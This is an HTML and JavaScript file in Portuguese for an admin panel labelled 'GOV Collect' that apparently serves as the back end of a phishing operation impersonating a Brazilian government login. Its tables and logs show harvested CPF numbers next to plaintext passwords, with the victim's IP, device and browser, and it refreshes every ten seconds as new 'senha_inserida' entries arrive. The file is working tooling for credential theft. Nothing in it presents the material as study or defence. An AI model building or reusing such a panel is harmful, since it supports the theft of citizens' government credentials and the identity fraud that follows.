<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Dados Coletados</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            transition: background 0.3s ease, color 0.3s ease;
        }

        /* Tema Escuro (padrão) */
        body.dark {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-card: #1a1a1a;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --border: #2a2a2a;
            --accent: #00ff88;
            --accent-hover: #00cc66;
            --danger: #ff4444;
            --danger-hover: #cc0000;
            --warning: #ffaa00;
        }

        /* Tema Claro */
        body.light {
            --bg-primary: #f5f5f5;
            --bg-secondary: #ffffff;
            --bg-card: #ffffff;
            --text-primary: #1a1a1a;
            --text-secondary: #666666;
            --border: #e0e0e0;
            --accent: #0066cc;
            --accent-hover: #0052a3;
            --danger: #dc3545;
            --danger-hover: #b02a37;
            --warning: #ffc107;
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
        }

        /* Login Screen */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .login-card {
            background: var(--bg-card);
            padding: 40px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            border: 1px solid var(--border);
        }

        .login-card h1 {
            text-align: center;
            margin-bottom: 10px;
            color: var(--accent);
        }

        .login-card p {
            text-align: center;
            margin-bottom: 30px;
            color: var(--text-secondary);
        }

        .login-card input {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 16px;
            background: var(--bg-primary);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 14px;
        }

        .login-card input:focus {
            outline: none;
            border-color: var(--accent);
        }

        .login-card button {
            width: 100%;
            padding: 12px;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }

        .login-card button:hover {
            background: var(--accent-hover);
        }

        .error-msg {
            background: var(--danger);
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 16px;
            text-align: center;
            font-size: 14px;
        }

        /* Admin Panel */
        .admin-container {
            display: none;
        }

        .admin-container.visible {
            display: flex;
        }

        /* Sidebar */
        .sidebar {
            width: 280px;
            min-height: 100vh;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border);
            position: fixed;
            left: 0;
            top: 0;
            transition: all 0.3s;
            z-index: 100;
        }

        .sidebar-header {
            padding: 24px;
            border-bottom: 1px solid var(--border);
        }

        .sidebar-header h2 {
            color: var(--accent);
            font-size: 20px;
        }

        .sidebar-header p {
            color: var(--text-secondary);
            font-size: 12px;
            margin-top: 5px;
        }

        .sidebar-menu {
            padding: 20px;
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            margin-bottom: 8px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            color: var(--text-secondary);
        }

        .menu-item:hover {
            background: var(--bg-primary);
            color: var(--text-primary);
        }

        .menu-item.active {
            background: var(--accent);
            color: white;
        }

        .menu-item i {
            width: 24px;
        }

        .sidebar-footer {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            padding: 20px;
            border-top: 1px solid var(--border);
        }

        /* Main Content */
        .main-content {
            margin-left: 280px;
            padding: 24px;
            width: calc(100% - 280px);
        }

        /* Top Bar */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding: 16px 24px;
            background: var(--bg-card);
            border-radius: 16px;
            border: 1px solid var(--border);
        }

        .theme-toggle {
            background: var(--bg-primary);
            border: 1px solid var(--border);
            padding: 8px 16px;
            border-radius: 30px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-primary);
        }

        .home-btn {
            background: var(--bg-primary);
            border: 1px solid var(--border);
            padding: 8px 16px;
            border-radius: 30px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-primary);
            text-decoration: none;
        }

        .logout-btn {
            background: var(--danger);
            border: none;
            padding: 8px 20px;
            border-radius: 30px;
            cursor: pointer;
            color: white;
            font-weight: 600;
        }

        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 20px;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: var(--accent);
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 14px;
            margin-top: 8px;
        }

        /* Tables */
        .section-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }

        .table-wrapper {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }

        th {
            color: var(--text-secondary);
            font-weight: 500;
            font-size: 12px;
            text-transform: uppercase;
        }

        td {
            font-size: 13px;
        }

        .senha {
            font-family: monospace;
            font-weight: bold;
            color: var(--warning);
        }

        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }

        .badge-success { background: var(--accent); color: white; }
        .badge-danger { background: var(--danger); color: white; }

        .btn-delete {
            background: var(--danger);
            border: none;
            padding: 5px 12px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 12px;
        }

        .btn-clear {
            background: var(--warning);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            color: #1a1a1a;
            cursor: pointer;
            font-weight: 600;
        }

        .log-entry {
            padding: 8px;
            border-bottom: 1px solid var(--border);
            font-size: 12px;
            font-family: monospace;
        }

        /* Mobile */
        @media (max-width: 768px) {
            .sidebar {
                transform: translateX(-100%);
            }
            .sidebar.open {
                transform: translateX(0);
            }
            .main-content {
                margin-left: 0;
                width: 100%;
            }
            .menu-toggle {
                display: fixed;
                bottom: 20px;
                left: 20px;
                position: fixed;
                background: var(--accent);
                padding: 12px;
                border-radius: 50%;
                cursor: pointer;
                z-index: 200;
            }
        }

        @media (min-width: 769px) {
            .menu-toggle {
                display: none;
            }
        }

        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 10px;
        }
    </style>
</head>
<body class="dark">

<!-- Login Screen -->
<div id="loginScreen" class="login-screen">
    <div class="login-card">
        <h1><i class="fas fa-shield-alt"></i> Admin Panel</h1>
        <p>Acesso restrito - Digite suas credenciais</p>
        <div id="loginError" class="error-msg" style="display: none;"></div>
        <input type="text" id="username" placeholder="Usuário">
        <input type="password" id="password" placeholder="Senha">
        <button onclick="fazerLogin()"><i class="fas fa-arrow-right"></i> Entrar</button>
    </div>
</div>

<!-- Admin Panel -->
<div id="adminPanel" class="admin-container">
    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <h2><i class="fas fa-database"></i> GOV Collect</h2>
            <p>Painel de Controle</p>
        </div>
        <div class="sidebar-menu">
            <div class="menu-item active" data-tab="dashboard">
                <i class="fas fa-chart-line"></i> Dashboard
            </div>
            <div class="menu-item" data-tab="users">
                <i class="fas fa-users"></i> Usuários
            </div>
            <div class="menu-item" data-tab="logs">
                <i class="fas fa-history"></i> Logs
            </div>
            <div class="menu-item" data-tab="security">
                <i class="fas fa-shield-alt"></i> Segurança
            </div>
        </div>
        <div class="sidebar-footer">
            <div class="menu-item" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i> Sair
            </div>
        </div>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <div class="top-bar">
            <div style="display: flex; gap: 12px;">
                <a href="/" class="home-btn" target="_blank">
                    <i class="fas fa-home"></i> Home
                </a>
            </div>
            <div style="display: flex; gap: 12px;">
                <button class="theme-toggle" onclick="toggleTheme()">
                    <i class="fas fa-moon"></i>
                    <span id="themeText">Modo Escuro</span>
                </button>
                <button class="logout-btn" onclick="logout()">
                    <i class="fas fa-sign-out-alt"></i> Sair
                </button>
            </div>
        </div>

        <!-- Menu Mobile Toggle -->
        <div class="menu-toggle" onclick="document.getElementById('sidebar').classList.toggle('open')">
            <i class="fas fa-bars"></i>
        </div>

        <!-- Dashboard Tab -->
        <div id="tab-dashboard" class="tab-content active">
            <div class="stats-grid" id="statsGrid"></div>
            <div class="section-card">
                <div class="section-title">Últimos Logs</div>
                <div id="ultimosLogs" class="log-container"></div>
            </div>
        </div>

        <!-- Users Tab -->
        <div id="tab-users" class="tab-content">
            <div class="section-card">
                <div class="section-title">
                    Usuários Coletados
                    <button class="btn-clear" style="float: right;" onclick="limparDados()">
                        <i class="fas fa-trash"></i> Limpar Todos
                    </button>
                </div>
                <div class="table-wrapper">
                    <table>
                        <thead>
                            <tr><th>CPF</th><th>SENHA</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Ação</th</rot>
                        </thead>
                        <tbody id="usersTable"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Logs Tab -->
        <div id="tab-logs" class="tab-content">
            <div class="section-card">
                <div class="section-title">Histórico de Atividades</div>
                <div id="logsList" class="log-container"></div>
            </div>
        </div>

        <!-- Security Tab -->
        <div id="tab-security" class="tab-content">
            <div class="section-card">
                <div class="section-title">Tentativas de Acesso ao Admin</div>
                <div class="table-wrapper">
                    <table>
                        <thead>
                            <tr><th>IP</th><th>Tentativa</th><th>Data</th></tr>
                        </thead>
                        <tbody id="tentativasTable"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </main>
</div>

<script>
    let adminToken = null;

    async function fazerLogin() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const errorDiv = document.getElementById('loginError');
        
        if (!username || !password) {
            errorDiv.style.display = 'block';
            errorDiv.innerHTML = 'Preencha usuário e senha';
            return;
        }
        
        try {
            const res = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            
            const data = await res.json();
            
            if (data.success) {
                adminToken = data.token;
                localStorage.setItem('admin_token', adminToken);
                document.cookie = `admin_token=${adminToken}; path=/; Secure; SameSite=Strict`;
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('adminPanel').classList.add('visible');
                carregarDados();
                iniciarRefresh();
            } else {
                errorDiv.style.display = 'block';
                errorDiv.innerHTML = data.error || 'Usuário ou senha inválidos';
            }
        } catch (error) {
            errorDiv.style.display = 'block';
            errorDiv.innerHTML = 'Erro ao conectar';
        }
    }
    
    function logout() {
        fetch('/api/admin/logout', { method: 'POST' });
        localStorage.removeItem('admin_token');
        adminToken = null;
        document.getElementById('adminPanel').classList.remove('visible');
        document.getElementById('loginScreen').style.display = 'flex';
        if (refreshInterval) clearInterval(refreshInterval);
    }
    
    function toggleTheme() {
        const body = document.body;
        const themeText = document.getElementById('themeText');
        if (body.classList.contains('dark')) {
            body.classList.remove('dark');
            body.classList.add('light');
            themeText.innerHTML = 'Modo Claro';
            localStorage.setItem('theme', 'light');
        } else {
            body.classList.remove('light');
            body.classList.add('dark');
            themeText.innerHTML = 'Modo Escuro';
            localStorage.setItem('theme', 'dark');
        }
    }
    
    // Carregar tema salvo
    if (localStorage.getItem('theme') === 'light') {
        document.body.classList.remove('dark');
        document.body.classList.add('light');
        document.getElementById('themeText').innerHTML = 'Modo Claro';
    }
    
    function formatarCPF(cpf) {
        if (!cpf) return '';
        cpf = cpf.toString();
        if (cpf.length === 11) {
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }
        return cpf;
    }
    
    async function carregarDados() {
        if (!adminToken) return;
        
        try {
            // Estatísticas
            const statsRes = await fetch('/api/admin/stats', {
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            const statsData = await statsRes.json();
            const stats = statsData.stats || {};
            
            const statsGrid = document.getElementById('statsGrid');
            statsGrid.innerHTML = `
                <div class="stat-card"><div class="stat-value">${stats.total_users || 0}</div><div class="stat-label">Total Usuários</div></div>
                <div class="stat-card"><div class="stat-value">${stats.com_senha || 0}</div><div class="stat-label">Com Senha</div></div>
                <div class="stat-card"><div class="stat-value">${stats.total_logs || 0}</div><div class="stat-label">Total Logs</div></div>
                <div class="stat-card"><div class="stat-value">${stats.tentativas_admin || 0}</div><div class="stat-label">Tentativas Admin</div></div>
            `;
            
            // Usuários
            const usersRes = await fetch('/api/admin/users', {
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            const usersData = await usersRes.json();
            const users = usersData.users || [];
            
            const usersTable = document.getElementById('usersTable');
            if (users.length === 0) {
                usersTable.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado</td></tr>';
            } else {
                usersTable.innerHTML = users.map(u => `
                    <tr>
                        <td>${formatarCPF(u.cpf)}</td>
                        <td class="senha">${u.senha || '--------'}</td>
                        <td>${u.ip || u.ip_senha || '-'}</td>
                        <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
                        <td>${u.navegador || u.navegador_senha || '-'}</td>
                        <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
                        <td><button class="btn-delete" onclick="deletarUsuario('${u.cpf}')">Excluir</button></td>
                    </tr>
                `).join('');
            }
            
            // Logs
            const logsRes = await fetch('/api/admin/logs', {
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            const logsData = await logsRes.json();
            const logs = logsData.logs || [];
            
            const logsDiv = document.getElementById('logsList');
            if (logs.length === 0) {
                logsDiv.innerHTML = '<div class="log-entry">Nenhum log registrado</div>';
            } else {
                logsDiv.innerHTML = logs.map(log => `
                    <div class="log-entry">
                        [${new Date(log.data).toLocaleString()}] 
                        <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo}</span>
                        CPF: ${log.cpf} | IP: ${log.ip || '-'} | ${log.dispositivo || '-'}
                        ${log.senha ? '<span style="color:#ffaa00"> | SENHA: ' + log.senha + '</span>' : ''}
                    </div>
                `).join('');
            }
            
            // Últimos logs para dashboard
            const ultimosLogs = document.getElementById('ultimosLogs');
            if (ultimosLogs) {
                ultimosLogs.innerHTML = logs.slice(0, 10).map(log => `
                    <div class="log-entry">
                        [${new Date(log.data).toLocaleString()}] 
                        <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo}</span>
                        CPF: ${log.cpf} | ${log.dispositivo || '-'}
                    </div>
                `).join('');
            }
            
            // Tentativas de admin
            const tentativasRes = await fetch('/api/admin/tentativas', {
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            const tentativasData = await tentativasRes.json();
            const tentativas = tentativasData.tentativas || [];
            
            const tentativasTable = document.getElementById('tentativasTable');
            if (tentativas.length === 0) {
                tentativasTable.innerHTML = '<tr><td colspan="3" style="text-align:center">Nenhuma tentativa registrada</td></tr>';
            } else {
                tentativasTable.innerHTML = tentativas.map(t => `
                    <tr>
                        <td>${t.ip || '-'}</td>
                        <td>${t.tentativa || '-'}</td>
                        <td>${new Date(t.data).toLocaleString()}</td>
                    </tr>
                `).join('');
            }
            
        } catch (error) {
            console.error('Erro ao carregar dados:', error);
        }
    }
    
    async function deletarUsuario(cpf) {
        if (!confirm(`Tem certeza que deseja excluir o usuário ${cpf}?`)) return;
        try {
            await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            carregarDados();
        } catch (error) {
            alert('Erro ao deletar usuário');
        }
    }
    
    async function limparDados() {
        if (!confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados coletados. Continuar?')) return;
        try {
            await fetch('/api/admin/clear', {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${adminToken}` }
            });
            carregarDados();
            alert('Todos os dados foram removidos');
        } catch (error) {
            alert('Erro ao limpar dados');
        }
    }
    
    // Navegação
    document.querySelectorAll('.menu-item').forEach(item => {
        item.addEventListener('click', () => {
            const tab = item.getAttribute('data-tab');
            document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.getElementById(`tab-${tab}`).classList.add('active');
            if (window.innerWidth <= 768) {
                document.getElementById('sidebar').classList.remove('open');
            }
        });
    });
    
    let refreshInterval = null;
    function iniciarRefresh() {
        if (refreshInterval) clearInterval(refreshInterval);
        refreshInterval = setInterval(carregarDados, 10000);
    }
    
    // Verificar token salvo
    const savedToken = localStorage.getItem('admin_token');
    if (savedToken) {
        adminToken = savedToken;
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('adminPanel').classList.add('visible');
        carregarDados();
        iniciarRefresh();
    }
</script>
</body>
</html>
